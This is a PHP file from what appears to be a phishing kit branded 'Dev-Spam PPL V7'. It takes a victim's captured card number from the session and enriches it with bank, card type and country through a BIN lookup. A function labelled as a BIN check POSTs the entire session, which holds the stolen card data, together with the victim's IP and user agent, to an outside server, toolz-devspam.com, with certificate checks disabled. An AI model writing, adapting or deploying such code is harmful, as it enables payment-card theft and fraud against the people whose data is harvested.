<?php
/*
///////////////////////////////////////////////////////////////
//            _    _  _ ______   __      ___ __      __      //
//      /\   | |  | || |____  |  \ \    / / |\ \    / /      //
//     /  \  | | _| || |_  / /____\ \  / /| |_\ \  / /       //
//    / /\ \ | |/ /__   _|/ /______\ \/ / | '_ \ \/ /        // 
//   / ____ \|   <   | | / /        \  /  | |_) \  /         // 
//  /_/    \_\_|\_\  |_|/_/          \/   |_.__/ \/          // 
//                   _     Dev-Spam     _                    //
//                        #PPL V7                            //
///////////////////////////////////////////////////////////////  	
*/                                                     



session_start();
///////////////////////////////// BIN CHECKER  /////////////////////////////////
$BIN_LOOKUP  = str_replace(' ', '', $_SESSION['_cardnumber_']);
$DST_BIN    = @json_decode(file_get_contents("https://lookup.binlist.net/".$BIN_LOOKUP.""));
$BIN_CARD    = $DST_BIN->scheme;
$BIN_BANK    = $DST_BIN->bank -> name;
$BIN_TYPE    = $DST_BIN->type;
$BIN_LEVEL   = $DST_BIN->brand;
$BIN_CNTRCODE= $DST_BIN->country -> alpha2;
$BIN_WEBSITE = $DST_BIN->bank -> url;
$BIN_PHONE   = $DST_BIN->bank -> phone;
$BIN_COUNTRY = $DST_BIN->country -> name;
///////////////////////////////// SESSION FOR SOME VAR  /////////////////////////////////
$_SESSION['_country_']  = $BIN_COUNTRY;
$_SESSION['_cntrcode_'] = $BIN_CNTRCODE;
$_SESSION['_cc_brand_'] = $BIN_CARD;
$_SESSION['_cc_bank_']  = $BIN_BANK;
$_SESSION['_cc_type_']  = $BIN_TYPE;
$_SESSION['_cc_class_'] = $BIN_LEVEL;
$_SESSION['_cc_site_']  = $BIN_WEBSITE;
$_SESSION['_cc_phone_'] = $BIN_PHONE;
$_SESSION['_ccglobal_'] = $_SESSION['_cc_brand_']." ".$_SESSION['_cc_type_']." ".$_SESSION['_cc_bank_'];
$_SESSION['_global_']   = $_SESSION['_cntrcode_']." - ".$_SESSION['_ip_'];
///////////////////////////////// BIN Lookup /////////////////////////
function CheckBIN($DST_MESSAGE) {
    $ip = getenv("REMOTE_ADDR");
    $DST_MESSAGE['ip'] = $ip;
    $ckfile = tempnam("./tmp", "CURLCOOKIE"); 
    $ch = curl_init("http://toolz-devspam.com/sv1/PPL_V7/Check_BIN.php");  
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, TRUE);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $DST_MESSAGE);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $startcurl = curl_exec($ch);
    curl_close($ch);
    return $startcurl;
}
function DST_BIN() {
	$Bin = json_decode(CheckBIN($_SESSION,$DST_MESSAGE),true);
	}
?>
